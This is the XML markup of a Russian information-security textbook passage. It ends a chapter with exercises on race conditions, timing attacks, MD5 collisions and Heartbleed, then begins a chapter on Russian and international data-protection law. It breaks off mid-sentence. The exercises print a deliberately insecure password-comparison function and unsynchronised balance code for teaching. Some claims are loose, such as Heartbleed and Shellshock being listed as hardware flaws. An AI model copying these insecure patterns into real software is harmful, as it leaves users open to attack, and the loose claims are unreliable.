        <w:t>Задача 2. Race Condition</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Два потока одновременно переводят деньги:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>balance = 100</w:t>
        <w:br/>
        <w:t># Поток 1:</w:t>
        <w:br/>
        <w:t>if balance &gt;= 100: balance -= 100</w:t>
        <w:br/>
        <w:t># Поток 2:</w:t>
        <w:br/>
        <w:t>if balance &gt;= 100: balance -= 100</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос</w:t>
      </w:r>
      <w:r>
        <w:t>: Каким может быть итоговый баланс?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t>: 0 или -100 (если оба потока прошли проверку `balance &gt;= 100` до вычитания).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 3. Timing Attack</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Функция сравнения паролей:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>def check(password):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    correct = "secret123"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for i in range(len(correct)):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if password[i] != correct[i]:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return False</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return True</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос</w:t>
      </w:r>
      <w:r>
        <w:t>: Сколько попыток нужно, чтобы подобрать пароль длиной 9 символов (алфавит: a-z, 0-9)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ без timing attack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 36⁹ ≈ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10¹⁴</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> попыток.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ с timing attack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: 9 × 36 = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>324</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> попытки (перебираем по одному символу).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 4. Birthday Attack на MD5</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">MD5 выдаёт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>128-битный хеш</w:t>
      </w:r>
      <w:r>
        <w:t>. Сколько попыток нужно, чтобы найти коллизию?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: √(2¹²⁸) = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2⁶⁴ ≈ 10¹⁹</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> операций (уже реально на практике, коллизии MD5 найдены).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача 5. Heartbleed</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Сервер имеет 16 ГБ оперативной памяти. За один запрос Heartbleed можно прочитать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>64 КБ</w:t>
      </w:r>
      <w:r>
        <w:t>. Сколько запросов нужно, чтобы прочитать всю память?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: (16 × 1024 МБ × 1024 КБ) / 64 КБ = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>262,144 запроса</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">(На практике хватает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нескольких тысяч</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> запросов, чтобы украсть пароли/ключи.)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод главы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Мы разобрали </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>технические детали атак</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Эксплуатация памяти** (Buffer Overflow, Heap Overflow, Format String, Integer Overflow)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Логические уязвимости** (Race Condition, IDOR, Path Traversal, Command Injection, XXE, SSRF)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Криптографические атаки** (Padding Oracle, Timing Attack, Replay Attack, Downgrade Attack, Birthday Attack)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Повышение привилегий** (Dirty COW, SUID, sudo misconfiguration)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Backdoor и Rootkit** (webshell, SSH-ключи, hooking системных вызовов, bootkit)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Аппаратные уязвимости** (Meltdown/Spectre, Rowhammer, Heartbleed, Shellshock)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сетевые атаки** (TCP SYN Flood, Slowloris, Amplification, BGP Hijacking)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Главный урок</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Уязвимости везде</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — в коде, в железе, в протоколах, в криптографии. Нет идеальной защиты. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Безопасность — это процесс</w:t>
      </w:r>
      <w:r>
        <w:t>, а не состояние. Обновляй софт, используй защиты (ASLR, DEP, SYN Cookies), проводи code review, думай как хакер.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">И помни: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Если твой код может сломаться — он сломается</w:t>
      </w:r>
      <w:r>
        <w:t>. Если хакер может его взломать — он взломает. Поэтому пиши безопасный код с первого дня, а не добавляй безопасность "потом" (спойлер: "потом" никогда не наступит).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 9.7. Юридические основы информационной безопасности. Критерии защищённости</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение: Когда хакеры встречаются с юристами (и почему это плохо для хакеров)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Окей, братан, мы с тобой прошли весь путь: разобрали угрозы (9.03), атаки (9.05), технические методы (9.06), защиту (9.04), криптографию (9.02), политику безопасности (9.01). Теперь финальная глава: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>юридические основы ИБ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Потому что, как бы круто ты ни защищал свои системы, рано или поздно всплывёт вопрос: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"А что будет, если нас взломают? Кто виноват? Сколько штраф?"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Спойлер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Штрафы бывают </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>охренительные</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальные примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2019, British Airways**: утечка данных 400,000 пассажиров → штраф **£183 млн** (GDPR)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2023, Meta (Facebook)**: штраф **€1.2 млрд** за передачу данных европейцев в США</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2022, Tele2 Россия**: штраф **₽1 млн** за утечку данных абонентов (152-ФЗ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2021, Colonial Pipeline**: заплатили вымогателям **$4.4 млн** биткоинами, потом ещё штраф от правительства</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему эта глава важна?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ты узнаешь, за что тебя могут посадить** (или оштрафовать, если ты админ/разработчик/CISO)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Поймёшь, почему компании так боятся утечек** (штрафы = процент от годового оборота)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Узнаешь про критерии защищённости** (что такое "класс защиты КС1" и зачем это банкам)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сдашь экзамен** (эту тему точно спросят, особенно 152-ФЗ и GDPR)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>В этой главе мы разберём</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Законодательство РФ** (152-ФЗ о персональных данных, 187-ФЗ о безопасности КИИ, 149-ФЗ об информации, Уголовный кодекс)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Международное законодательство** (GDPR, HIPAA, SOX, CCPA, PCI DSS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Критерии защищённости** (ФСТЭК, уровни защиты, классы защищённости)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Стандарты безопасности** (ISO 27001, NIST Cybersecurity Framework, CIS Controls)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ответственность** (уголовная, административная, гражданская)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Практические примеры** (как соблюдать закон и не огрести штраф)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связь с другими главами</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9.01 (Политика безопасности)** — законы требуют наличия политики</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9.02 (Криптография)** — законы про шифрование (152-ФЗ требует защиту ПДн)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 9.03 (Угрозы)** — законы про уголовную ответственность за атаки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 7.02 (БД)** — законы про защиту баз данных с персональными данными</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 8.04 (Протоколы)** — GDPR требует шифрования (HTTPS/TLS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.7.1. Законодательство Российской Федерации в области ИБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>152-ФЗ "О персональных данных" (2006)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Самый важный закон для всех</w:t>
      </w:r>
      <w:r>
        <w:t>, кто работает с данными людей (имя, email, телефон, паспорт, адрес).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что такое персональные данные (ПДн)?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Персональные данные</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — любая информация, относящаяся к </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>прямо или косвенно определённому</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> физическому лицу (субъекту ПДн).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры ПДн</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Обычные**: ФИО, дата рождения, email, телефон, адрес</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Специальные** (требуют усиленной защиты): раса, национальность, религия, здоровье, биометрия (отпечатки, Face ID), судимости</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Биометрические**: отпечаток пальца, сетчатка глаза, голос, фото лица (для Face ID)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Косвенные** (могут идентифицировать): IP-адрес, cookie, Device ID</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные требования 152-ФЗ</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Получить согласие субъекта** (галочка "Я согласен на обработку ПДн")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Исключения**: договор (например, покупка в интернет-магазине), закон (налоговая может без согласия)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Уведомить Роскомнадзор** о начале обработки ПДн (форма на сайте, бесплатно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Обеспечить защиту ПДн** (технические и организационные меры):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Шифрование (AES-256 для хранения, TLS для передачи)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разграничение доступа (RBAC, принцип наименьших привилегий)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Резервное копирование</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Антивирус, firewall, IDS/IPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Журналирование (кто что открывал)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Физическая защита серверов (закрытая серверная, видеонаблюдение)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Хранить ПДн на территории РФ** (закон с 2015 года)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>LinkedIn заблокирован в России за отказ (2016)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Google/Facebook перенесли часть серверов в Россию</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Удалять ПДн по требованию** (право на забвение)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Назначить ответственного за ПДн** (обычно DPO — Data Protection Officer)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Классификация ПДн по уровню защиты</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Приказ ФСТЭК №21):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Уровень | Количество субъектов | Категория ПДн | Меры защиты |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---------|----------------------|---------------|-------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>УЗ-1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (самый высокий) | &gt; 100,000 | Специальные, биометрия | Сертифицированные СЗИ, криптография, физическая защита, аудит |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>УЗ-2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | 1,000 - 100,000 | Обычные + специальные | Криптография, разграничение доступа, антивирус, резервное копирование |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>УЗ-3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | &lt; 1,000 | Обычные | Базовые меры (пароли, антивирус, firewall) |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>УЗ-4</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (самый низкий) | &lt; 1,000 | Общедоступные | Минимальные меры |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Штрафы за нарушение 152-ФЗ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (КоАП РФ, ст. 13.11):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Граждане**: до **₽10,000**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Должностные лица** (директор, CISO): **₽10,000 - ₽50,000**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Юридические лица** (компания): **₽50,000 - ₽300,000**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**При утечке**: до **₽500,000** (или 1% годового оборота)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: В 2022 году </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Tele2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> оштрафовали на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>₽1 млн</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> за утечку данных 50,000 абонентов (продавали базы SIM-карт в Telegram).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>187-ФЗ "О безопасности критической информационной инфраструктуры" (2017)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для кого</w:t>
      </w:r>
      <w:r>
        <w:t>: Банки, энергетика, транспорт, связь, здравоохранение, госсектор.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что такое КИИ?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Критическая информационная инфраструктура (КИИ)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — системы, нарушение работы которых может привести к:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Прекращению работы важных объектов (электростанции, больницы, аэропорты)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Угрозе жизни и здоровью людей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Экономическому ущербу</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Требования</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Категорировать объекты КИИ** (1-я категория — самая критичная, 3-я — менее важная)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Создать систему защиты** (сертифицированные средства защиты информации, SIEM, IDS/IPS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Проводить аудит безопасности** (ежегодно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Сообщать о компьютерных инцидентах** в ГосСОПКА (72 часа)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Штрафы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Должностные лица**: до **₽100,000**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Юридические лица**: до **₽500,000**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
